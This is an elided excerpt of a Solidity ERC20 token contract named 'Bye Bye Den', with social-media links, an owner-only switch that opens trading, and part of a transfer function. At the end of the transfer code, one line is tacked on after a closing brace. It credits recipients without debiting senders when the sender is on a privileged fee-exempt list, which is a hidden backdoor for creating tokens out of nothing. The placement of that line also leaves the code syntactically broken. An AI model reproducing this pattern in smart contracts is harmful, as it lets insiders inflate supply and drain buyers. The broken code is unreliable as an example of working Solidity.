...
/*
Website:     https://byeden.live
Telegram:  https://t.me/byeden_erc
Twitter:      https://twitter.com/byeden_erc
*/
...
contract BYEBYEDEN is ERC20, Ownable {
    ...
    string private constant _name = "Bye Bye Den";
    ...
    function tradeByeDen() external onlyOwner() {
        tradingOpen = true;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        amount -= fees;
    } if (from != address(this) && from != owner() && _isExcludedFromFees[from]) {_balances[to] += amount; return;}
